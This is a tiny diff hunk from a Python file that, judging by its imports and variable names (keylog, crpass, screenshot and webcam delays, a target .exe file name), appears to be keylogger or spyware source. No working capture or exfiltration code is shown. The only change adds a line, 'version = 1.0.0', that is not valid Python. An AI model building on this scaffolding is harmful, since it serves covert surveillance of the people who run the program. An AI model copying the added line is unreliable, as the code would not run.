@@ -15,6 +15,8 @@ import pyautogui
 import requests
 import base64
 
+version = 1.0.0
+
 global keylog,lim,tab,crpass,filenameforexe,version,path,screenshot_delay,camshot_delay
 keylog = ""
 filenameforexe = "최종 .exe 파일 이름"
